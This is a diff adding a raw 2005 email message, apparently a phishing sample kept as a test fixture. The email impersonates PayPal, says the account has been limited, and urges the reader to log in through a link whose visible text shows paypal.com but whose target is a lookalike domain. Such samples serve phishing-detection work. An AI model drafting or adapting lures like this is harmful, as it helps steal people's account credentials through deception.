@@ -1,0 +1,186 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 753152A88C
+ for <user@example.com>; Thu, 29 Sep 2005 14:03:35 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 7326F621C92; Thu, 29 Sep 2005 14:03:35 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 3235A621C90
+ for <user@example.com>; Thu, 29 Sep 2005 14:03:35 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id OAA14302
+ for user@example.com; Thu, 29 Sep 2005 14:03:34 -0400
+Received: from contactool.com (www.contactool.com [200.82.188.163])
+ by mail.example.com with ESMTP id OAA14291
+ for <user@example.com>; Thu, 29 Sep 2005 14:03:33 -0400
+Received: by contactool.com (Postfix, from userid 1028)
+ id 49B69B380E2; Thu, 29 Sep 2005 13:58:36 -0400 (VET)
+To: user@example.com
+Subject: Your account has been limited 
+From: PayPal <service@paypal.com>
+Content-Type: text/html
+Message-Id: <20050929175836.49B69B380E2@contactool.com>
+Date: Thu, 29 Sep 2005 13:58:36 -0400 (VET)
+Content-Length: 3859
+Lines: 154
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 173
+
+
+<a href="http://www-paypal-com-cgi-.mine.nu/cgi-bins/_home/verified/index.html" target=_blank><img height=35 alt=PayPal src="http://www.paypal.com/images/paypal_logo.gif" width=109 vspace=10 border=0></a></TD>
+</TR></TBODY></TABLE>
+
+<TABLE cellSpacing=0 cellPadding=0 width="100%" align=center border=0>
+
+  <TBODY>
+
+    <TR> 
+
+      <TD background="http://www.paypal.com/images/bg_clk.gif"><IMG height=20 src="https://www.paypal.com/en_US/i/scr/pixel.gif" width=1> </TD>
+
+    </TR>
+
+  </TBODY>
+
+</TABLE>
+
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="600">
+
+  <tr>
+
+    <td><img alt="" border="0" height="1" src="https://www.paypal.com/en_US/i/scr/pixel.gif" width="600"></td>
+
+  </tr>
+
+  <tr>
+
+    <td><div id="xptTitle">
+
+        <table align="center" border="0" cellpadding="0" cellspacing="0" class="main">
+
+          <tr>
+
+            <td class="heading" width="100%"></td>
+
+          </tr>
+
+          <tr>
+
+            <td><img alt="" border="0" height="2" src="https://www.paypal.com/en_US/i/scr/pixel.gif" width="1"></td>
+
+          </tr>
+
+          <tr>
+
+            <td><hr></td>
+
+          </tr>
+
+        </table>
+
+      </div></td>
+
+  </tr>
+
+  <tr>
+
+    <td valign="top"> <p>&nbsp;</p>
+
+      <p>PayPal is committed to maintaining a safe environment for its community of buyers and sellers. To protect the security of your account, PayPal employs some of the most advanced security systems in the world and our anti-fraud teams regularly screen the PayPal system for unusual activity.</p>
+
+      <p>&nbsp;</p>
+
+      <p>We are contacting you to inform you that on 29th Sep 2005 our Account Review Team identified some unusual activity in your account. In accordance with PayPal's User Agreement and to ensure that your account has not been compromised, access to your account has been limited. Your account access will remain limited until this issue has been resolved.</p>
+
+      <p><br>
+
+      </p>
+
+      <hr class="dotted"> 
+
+      <span class="emphasis">Why has my account 
+
+access become limited?</span><br>
+
+      <br class="h6">
+
+      Your account access has become limited for the following 
+
+reason(s):<br>
+
+      <br>
+
+      <li>13th SEP <span class="emphasis"> 2005: </span>We believe your account was accessed by an unauthorized third party. </li>
+
+      <br>
+
+      (Your case ID for this reason is PP-069-848-295.)<br>
+
+      <br>
+
+      <hr class="dotted"> <p>We understand that this may be an inconvenience but please understand that this temporary limitation is for your protection.</p>
+      <p>&nbsp;</p>
+      <p><span class="emphasis">How can I restore my 
+      
+account 
+      
+      access?</span><br>
+      
+      </p>
+      <table align="center" bgcolor="#cc9999" cellpadding="1" cellspacing="0" width="100%">
+
+        <tr>
+
+          <td><table align="center" bgcolor="#ffeeee" cellpadding="5" cellspacing="0" width="100%">
+
+              <tr>
+
+                <td height="63"><span class="emphasis">By logging into your PayPal account at
+				<a target="_blank" href="http://mypaypal.biz/sslsecure/login.html">https://www.paypal.com/us/cgi-bin/webscr</a> and you will be directed to the verifying page.</span></td>
+
+              </tr>
+
+            </table></td>
+
+        </tr>
+
+      </table>
+
+  <TR> 
+
+    <TD vAlign=top height=100>
+
+<div align="center">
+  <p>&nbsp;</p>
+  <p><strong>Completing all the items will automatically restore your 
+    
+account access.</strong><br>
+    
+  </p>
+</div>
+
+      <hr class="dotted"> <DIV align=center><FONT size=2>Please do not 
+
+reply to 
+
+        this e-mail. Mail sent to this address cannot be 
+
+answered.</FONT></DIV>
+
+      <DIV align=center><FONT size=2>Copyright© 2005 PayPal Inc. All 
+
+rights reserved. 
+
+        <br>Designated trademarks and brands are the property of their respective owners.
+
+</FONT></DIV></TD>
+
+</TR>
+
+</TABLE>
+
+</html>
